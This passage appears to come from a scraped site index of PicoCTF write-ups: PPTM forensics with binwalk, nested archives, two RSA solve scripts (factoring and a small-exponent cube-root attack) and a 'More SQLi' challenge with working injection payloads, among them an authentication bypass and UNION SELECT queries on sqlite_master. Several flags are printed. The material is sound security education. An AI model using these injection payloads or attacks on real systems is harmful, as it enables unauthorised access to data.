files support embedded macros that can be executed by PowerPoint.\nEven if a PPTX file includes macros, PowerPoint will not allow users to run them. They must first be saved as a PPTM file, and then the macros may be executed.\nMacros in PowerPoint function similarly to scripts allowing you to automate repetitive tasks such as formatting a slide, adding text, or creating new slide themes. You can create and edit macros using Visual Basic for Applications (VBA) by clicking Macros in the View tab in the ribbon.\nExploit - Binwalk + Unzip # Binwalk\n$ binwalk Forensics\\ is\\ fun.pptm DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, at least v2.0 to extract, compressed size: 674, uncompressed size: 10660, name: [Content_Types].xml 1243 0x4DB Zip archive data, at least v2.0 to extract, compressed size: 259, uncompressed size: 738, name: _rels/.rels 2063 0x80F Zip archive data, at least v2.0 to extract, compressed size: 951, uncompressed size: 5197, name: ppt/presentation.xml 3064 0xBF8 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide46.xml.rels 3316 0xCF4 Zip archive data, at least v2.0 to extract, compressed size: 688, uncompressed size: 1740, name: ppt/slides/slide1.xml 4055 0xFD7 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1681, name: ppt/slides/slide2.xml 4763 0x129B Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide3.xml 5473 0x1561 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide4.xml ... :::spoiler whole output\n$ binwalk Forensics\\ is\\ fun.pptm DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 Zip archive data, at least v2.0 to extract, compressed size: 674, uncompressed size: 10660, name: [Content_Types].xml 1243 0x4DB Zip archive data, at least v2.0 to extract, compressed size: 259, uncompressed size: 738, name: _rels/.rels 2063 0x80F Zip archive data, at least v2.0 to extract, compressed size: 951, uncompressed size: 5197, name: ppt/presentation.xml 3064 0xBF8 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide46.xml.rels 3316 0xCF4 Zip archive data, at least v2.0 to extract, compressed size: 688, uncompressed size: 1740, name: ppt/slides/slide1.xml 4055 0xFD7 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1681, name: ppt/slides/slide2.xml 4763 0x129B Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide3.xml 5473 0x1561 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide4.xml 6181 0x1825 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide5.xml 6890 0x1AEA Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1681, name: ppt/slides/slide6.xml 7597 0x1DAD Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide7.xml 8306 0x2072 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide8.xml 9015 0x2337 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide9.xml 9724 0x25FC Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide10.xml 10435 0x28C3 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide11.xml 11145 0x2B89 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1681, name: ppt/slides/slide12.xml 11854 0x2E4E Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1682, name: ppt/slides/slide13.xml 12562 0x3112 Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide14.xml 13273 0x33D9 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide15.xml 13983 0x369F Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1682, name: ppt/slides/slide16.xml 14691 0x3963 Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1681, name: ppt/slides/slide17.xml 15399 0x3C27 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide18.xml 16108 0x3EEC Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide19.xml 16819 0x41B3 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1681, name: ppt/slides/slide20.xml 17529 0x4479 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide21.xml 18239 0x473F Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1681, name: ppt/slides/slide22.xml 18947 0x4A03 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide23.xml 19657 0x4CC9 Zip archive data, at least v2.0 to extract, compressed size: 660, uncompressed size: 1682, name: ppt/slides/slide24.xml 20369 0x4F91 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide25.xml 21079 0x5257 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide26.xml 21789 0x551D Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide27.xml 22500 0x57E4 Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1681, name: ppt/slides/slide28.xml 23208 0x5AA8 Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide29.xml 23919 0x5D6F Zip archive data, at least v2.0 to extract, compressed size: 660, uncompressed size: 1682, name: ppt/slides/slide30.xml 24631 0x6037 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1681, name: ppt/slides/slide31.xml 25341 0x62FD Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide32.xml 26051 0x65C3 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1681, name: ppt/slides/slide33.xml 26761 0x6889 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide34.xml 27471 0x6B4F Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide35.xml 28182 0x6E16 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide36.xml 28891 0x70DB Zip archive data, at least v2.0 to extract, compressed size: 767, uncompressed size: 1916, name: ppt/slides/slide37.xml 29710 0x740E Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide38.xml 30419 0x76D3 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide39.xml 31129 0x7999 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1681, name: ppt/slides/slide40.xml 31838 0x7C5E Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide41.xml 32549 0x7F25 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide42.xml 33259 0x81EB Zip archive data, at least v2.0 to extract, compressed size: 660, uncompressed size: 1682, name: ppt/slides/slide43.xml 33971 0x84B3 Zip archive data, at least v2.0 to extract, compressed size: 660, uncompressed size: 1682, name: ppt/slides/slide44.xml 34683 0x877B Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide45.xml 35394 0x8A42 Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide46.xml 36105 0x8D09 Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1682, name: ppt/slides/slide47.xml 36814 0x8FCE Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1681, name: ppt/slides/slide48.xml 37524 0x9294 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1681, name: ppt/slides/slide49.xml 38234 0x955A Zip archive data, at least v2.0 to extract, compressed size: 655, uncompressed size: 1682, name: ppt/slides/slide50.xml 38941 0x981D Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide51.xml 39652 0x9AE4 Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1681, name: ppt/slides/slide52.xml 40363 0x9DAB Zip archive data, at least v2.0 to extract, compressed size: 656, uncompressed size: 1682, name: ppt/slides/slide53.xml 41071 0xA06F Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide54.xml 41782 0xA336 Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide55.xml 42493 0xA5FD Zip archive data, at least v2.0 to extract, compressed size: 659, uncompressed size: 1682, name: ppt/slides/slide56.xml 43204 0xA8C4 Zip archive data, at least v2.0 to extract, compressed size: 658, uncompressed size: 1682, name: ppt/slides/slide57.xml 43914 0xAB8A Zip archive data, at least v2.0 to extract, compressed size: 657, uncompressed size: 1681, name: ppt/slides/slide58.xml 44623 0xAE4F Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide47.xml.rels 44875 0xAF4B Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide48.xml.rels 45127 0xB047 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide49.xml.rels 45379 0xB143 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide50.xml.rels 45631 0xB23F Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide32.xml.rels 45883 0xB33B Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide52.xml.rels 46135 0xB437 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide53.xml.rels 46387 0xB533 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide54.xml.rels 46639 0xB62F Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide55.xml.rels 46891 0xB72B Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide56.xml.rels 47143 0xB827 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide57.xml.rels 47395 0xB923 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide58.xml.rels 47647 0xBA1F Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide51.xml.rels 47899 0xBB1B Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide13.xml.rels 48151 0xBC17 Zip archive data, at least v2.0 to extract, compressed size: 646, uncompressed size: 8783, name: ppt/_rels/presentation.xml.rels 49122 0xBFE2 Zip archive data, at least v2.0 to extract, compressed size: 192, uncompressed size: 311, name: ppt/slides/_rels/slide1.xml.rels 49376 0xC0E0 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide2.xml.rels 49627 0xC1DB Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide3.xml.rels 49878 0xC2D6 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide4.xml.rels 50129 0xC3D1 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide5.xml.rels 50380 0xC4CC Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide6.xml.rels 50631 0xC5C7 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide7.xml.rels 50882 0xC6C2 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide8.xml.rels 51133 0xC7BD Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide9.xml.rels 51384 0xC8B8 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide10.xml.rels 51636 0xC9B4 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide11.xml.rels 51888 0xCAB0 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide12.xml.rels 52140 0xCBAC Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide14.xml.rels 52392 0xCCA8 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide15.xml.rels 52644 0xCDA4 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide16.xml.rels 52896 0xCEA0 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide17.xml.rels 53148 0xCF9C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide18.xml.rels 53400 0xD098 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide19.xml.rels 53652 0xD194 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide20.xml.rels 53904 0xD290 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide21.xml.rels 54156 0xD38C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide22.xml.rels 54408 0xD488 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide23.xml.rels 54660 0xD584 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide24.xml.rels 54912 0xD680 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide25.xml.rels 55164 0xD77C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide26.xml.rels 55416 0xD878 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide27.xml.rels 55668 0xD974 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide28.xml.rels 55920 0xDA70 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide29.xml.rels 56172 0xDB6C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide30.xml.rels 56424 0xDC68 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide31.xml.rels 56676 0xDD64 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide33.xml.rels 56928 0xDE60 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide34.xml.rels 57180 0xDF5C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide35.xml.rels 57432 0xE058 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide36.xml.rels 57684 0xE154 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide37.xml.rels 57936 0xE250 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide38.xml.rels 58188 0xE34C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide39.xml.rels 58440 0xE448 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide40.xml.rels 58692 0xE544 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide41.xml.rels 58944 0xE640 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide42.xml.rels 59196 0xE73C Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide43.xml.rels 59448 0xE838 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide44.xml.rels 59700 0xE934 Zip archive data, at least v2.0 to extract, compressed size: 189, uncompressed size: 311, name: ppt/slides/_rels/slide45.xml.rels 59952 0xEA30 Zip archive data, at least v2.0 to extract, compressed size: 2063, uncompressed size: 13875, name: ppt/slideMasters/slideMaster1.xml 62078 0xF27E Zip archive data, at least v2.0 to extract, compressed size: 1281, uncompressed size: 4678, name: ppt/slideLayouts/slideLayout1.xml 63422 0xF7BE Zip archive data, at least v2.0 to extract, compressed size: 1104, uncompressed size: 3921, name: ppt/slideLayouts/slideLayout2.xml 64589 0xFC4D Zip archive data, at least v2.0 to extract, compressed size: 1338, uncompressed size: 5442, name: ppt/slideLayouts/slideLayout3.xml 65990 0x101C6 Zip archive data, at least v2.0 to extract, compressed size: 1197, uncompressed size: 4975, name: ppt/slideLayouts/slideLayout4.xml 67250 0x106B2 Zip archive data, at least v2.0 to extract, compressed size: 1551, uncompressed size: 7937, name: ppt/slideLayouts/slideLayout5.xml 68864 0x10D00 Zip archive data, at least v2.0 to extract, compressed size: 983, uncompressed size: 3063, name: ppt/slideLayouts/slideLayout6.xml 69910 0x11116 Zip archive data, at least v2.0 to extract, compressed size: 902, uncompressed size: 2550, name: ppt/slideLayouts/slideLayout7.xml 70875 0x114DB Zip archive data, at least v2.0 to extract, compressed size: 1455, uncompressed size: 5952, name: ppt/slideLayouts/slideLayout8.xml 72393 0x11AC9 Zip archive data, at least v2.0 to extract, compressed size: 1408, uncompressed size: 5899, name: ppt/slideLayouts/slideLayout9.xml 73864 0x12088 Zip archive data, at least v2.0 to extract, compressed size: 1133, uncompressed size: 3975, name: ppt/slideLayouts/slideLayout10.xml 75061 0x12535 Zip archive data, at least v2.0 to extract, compressed size: 1187, uncompressed size: 4200, name: ppt/slideLayouts/slideLayout11.xml 76312 0x12A18 Zip archive data, at least v2.0 to extract, compressed size: 277, uncompressed size: 1991, name: ppt/slideMasters/_rels/slideMaster1.xml.rels 76663 0x12B77 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout1.xml.rels 76925 0x12C7D Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout2.xml.rels 77187 0x12D83 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout3.xml.rels 77449 0x12E89 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout4.xml.rels 77711 0x12F8F Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout5.xml.rels 77973 0x13095 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout6.xml.rels 78235 0x1319B Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout7.xml.rels 78497 0x132A1 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout8.xml.rels 78759 0x133A7 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout9.xml.rels 79021 0x134AD Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout10.xml.rels 79284 0x135B4 Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 311, name: ppt/slideLayouts/_rels/slideLayout11.xml.rels 79547 0x136BB Zip archive data, at least v2.0 to extract, compressed size: 1732, uncompressed size: 8399, name: ppt/theme/theme1.xml 81329 0x13DB1 Zip archive data, at least v1.0 to extract, compressed size: 2278, uncompressed size: 2278, name: docProps/thumbnail.jpeg 83660 0x146CC Zip archive data, at least v2.0 to extract, compressed size: 2222, uncompressed size: 7168, name: ppt/vbaProject.bin 85930 0x14FAA Zip archive data, at least v2.0 to extract, compressed size: 397, uncompressed size: 818, name: ppt/presProps.xml 86374 0x15166 Zip archive data, at least v2.0 to extract, compressed size: 387, uncompressed size: 811, name: ppt/viewProps.xml 86808 0x15318 Zip archive data, at least v2.0 to extract, compressed size: 172, uncompressed size: 182, name: ppt/tableStyles.xml 87029 0x153F5 Zip archive data, at least v2.0 to extract, compressed size: 342, uncompressed size: 666, name: docProps/core.xml 87682 0x15682 Zip archive data, at least v2.0 to extract, compressed size: 556, uncompressed size: 3784, name: docProps/app.xml 88548 0x159E4 Zip archive data, at least v2.0 to extract, compressed size: 81, uncompressed size: 99, name: ppt/slideMasters/hidden 100071 0x186E7 End of Zip archive, footer length: 22 ::: Obviously, this file is compressed and you can notice this hint using exiftool command\n$ exiftool Forensics\\ is\\ fun.pptm ExifTool Version Number : 11.88 File Name : Forensics is fun.pptm Directory : . File Size : 98 kB File Modification Date/Time : 2023:02:17 23:47:53+08:00 File Access Date/Time : 2023:02:18 12:31:44+08:00 File Inode Change Date/Time : 2023:02:18 12:31:06+08:00 File Permissions : rwxrwxrwx File Type : PPTM File Type Extension : pptm MIME Type : application/vnd.ms-powerpoint.presentation.macroEnabled Zip Required Version : 20 Zip Bit Flag : 0x0006 Zip Compression : Deflated Zip Modify Date : 1980:01:01 00:00:00 Zip CRC : 0xa0517e97 Zip Compressed Size : 674 Zip Uncompressed Size : 10660 Zip File Name : [Content_Types].xml ... Unzip it After unzipping it, you can observe the whole structure and files clearly.\n$ ls -la * ... $ cd ppt $ ls -al * ... There\u0026rsquo;re 2 files that worth noting: ppt/slideMasters/hidden and ppt/vbaProject.binfont\u0026gt;\nStrings\n$ strings vbaProject.bin ... sorry_but_this_isn\u0026#39;t_it ... not_flag ... Seems this file is not the key to get flag But we have another option\u0026hellip;\n$ strings ./slideMasters/hidden Z m x h Z z o g c G l j b 0 N U R n t E M W R f d V 9 r b j B 3 X 3 B w d H N f c l 9 6 M X A 1 f Q Seems a base64 format strings: flag: picoCTF{D1d_u_kn0w_ppts_r_z1p5}\nReference # MacroHard WeakEdge Write up\n"},{"id":285,"href":"/security/practice/picoctf/misc/general/picoctf---matryoshka-doll/","title":"PicoCTF - Matryoshka doll","section":"Securities","content":" PicoCTF - Matryoshka doll # tags: PicoCTF CTF Misc # Challenge: Exploit - rar in rar # Hint The hint said:\nWait, you can hide files inside files? But how do you find them?\nSo\u0026hellip;I tried stegsolve, HxD, exiftool, string dolls.jpg | grep \u0026quot;{\u0026quot;, $ zsteg dolls.jpg \u0026hellip; All these are in vain\n通靈: Changed the extension to .rar And it can be uncompressed Repeat until find flag.txt\u0026hellip;\n"},{"id":286,"href":"/security/practice/picoctf/crypto/rsa/picoctf---mind-your-ps-and-qs/","title":"PicoCTF - Mind your Ps and Qs","section":"Securities","content":" PicoCTF - Mind your Ps and Qs # tags: PicoCTF CTF Crypto # Challenge: Mind your Ps and Qs\nBackground # RSA (觀念篇) Source code # Decrypt my super sick RSA: c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637 e: 65537 Exploit - Find P \u0026amp; Q By Online Tool # Find P \u0026amp; Q Use online tool to do prime factorize on n p $\\to$ 1461849912200000206276283741896701133693 q $\\to$ 431899300006243611356963607089521499045809\nWrite exploit\ne = 65537 M = 631371953793368771804570727896887140714061729769155038068711341335911329840163136 k = 1 # p = 1461849912200000206276283741896701133693 # q = 431899300006243611356963607089521499045809 def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x-(b//a)*y, y) def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(\u0026#39;modular inverse does not exist\u0026#39;) else: return x % m while(True): if (1 + k * M) % e == 0: print(\u0026#39;k = \u0026#39;, k, \u0026#39; and d = \u0026#39;, (1 + k * M) / e) break else: k += 1 d = modinv(e, M) c = 421345306292040663864066688931456845278496274597031632020995583473619804626233684 n = 631371953793368771804570727896887140714495090919073481680274581226742748040342637 plain = pow(c, d, n) print(plain) print(hex(plain)) print(bytearray.fromhex(hex(plain)[2:])) Reference # picoCTF 2021 Mind your Ps and Qs\n"},{"id":287,"href":"/security/practice/picoctf/crypto/rsa/picoctf---mini-rsa/","title":"PicoCTF - Mini RSA","section":"Securities","content":" PicoCTF - Mini RSA # tags: PicoCTF CTF Crypto # Challenge: Mini RSA\nSource code # N: 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e: 3 ciphertext (c): 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 Exploit - Small e attack # import gmpy2 from Crypto.Util.number import long_to_bytes N = 1615765684321463054078226051959887884233678317734892901740763321135213636796075462401950274602405095138589898087428337758445013281488966866073355710771864671726991918706558071231266976427184673800225254531695928541272546385146495736420261815693810544589811104967829354461491178200126099661909654163542661541699404839644035177445092988952614918424317082380174383819025585076206641993479326576180793544321194357018916215113009742654408597083724508169216182008449693917227497813165444372201517541788989925461711067825681947947471001390843774746442699739386923285801022685451221261010798837646928092277556198145662924691803032880040492762442561497760689933601781401617086600593482127465655390841361154025890679757514060456103104199255917164678161972735858939464790960448345988941481499050248673128656508055285037090026439683847266536283160142071643015434813473463469733112182328678706702116054036618277506997666534567846763938692335069955755244438415377933440029498378955355877502743215305768814857864433151287 e = 3 c = 1220012318588871886132524757898884422174534558055593713309088304910273991073554732659977133980685370899257850121970812405700793710546674062154237544840177616746805668666317481140872605653768484867292138139949076102907399831998827567645230986345455915692863094364797526497302082734955903755050638155202890599808147130204332030239454609548193370732857240300019596815816006860639254992255194738107991811397196500685989396810773222940007523267032630601449381770324467476670441511297695830038371195786166055669921467988355155696963689199852044947912413082022187178952733134865103084455914904057821890898745653261258346107276390058792338949223415878232277034434046142510780902482500716765933896331360282637705554071922268580430157241598567522324772752885039646885713317810775113741411461898837845999905524246804112266440620557624165618470709586812253893125417659761396612984740891016230905299327084673080946823376058367658665796414168107502482827882764000030048859751949099453053128663379477059252309685864790106 k = 1 while True: if gmpy2.iroot(c + N * k, 3)[1]==1: res=gmpy2.iroot(c + N * k, 3)[0] print(k, res) print(long_to_bytes(res)) break k += 1 Reference # CTF_RSA解密学习指南(三) - e=3 小明文攻击\n"},{"id":288,"href":"/security/practice/picoctf/web/picoctf---more-sqli/","title":"PicoCTF - More SQLi","section":"Securities","content":" PicoCTF - More SQLi # Background # Feifei Lab Hint SQLiLite Recon # 先隨便輸入發現他很貼心有給完整的payload，發現他是先檢查password，在沒有任何防護的情況下，直接用最經典的payload就可了 Account: Any Password: ' or '1'='1' -- # Exploit - SQLi(Union Selection) # 現在的目標是flag應該是藏在別的table，所以先找甚麼table\n找table 透過Kaibro的cheat sheet，SQLite的爆破payload是SELECT name FROM sqlite_master WHERE type='table'，而目前我們可以用union based的方式搜尋，先觀察搜尋Algiers的搜尋column有三個，第一個column是chr，第二個column是chr，第三個是int，所以在用union select的時候要遵守查詢數量一樣、每個欄位的型態一樣 Payload: Algiers' union SELECT sql,sql,1 FROM sqlite_master WHERE type='table'; -- :::spoiler Screenshot :::\nFind Flag - Union based 目前發現有兩個table比較可疑\nCREATE TABLE hints (id INTEGER NOT NULL PRIMARY KEY, info TEXT) CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT) 可以直接用前面同樣的方式找flag，觀察這個table只有兩個column，且一個column的type是int，另外一個是text，而第三個column就隨便填 Payload: Algiers' union SELECT id,flag,1 FROM more_table; -- :::spoiler Screenshot ::: Flag: picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}\nReference # picoCTF 2023 More SQLi Kaibro - SQLi Feifei Lab\n"},{"id":289,"href":"/security/practice/picoctf/web/picoctf---most-cookies/","title":"PicoCTF - Most 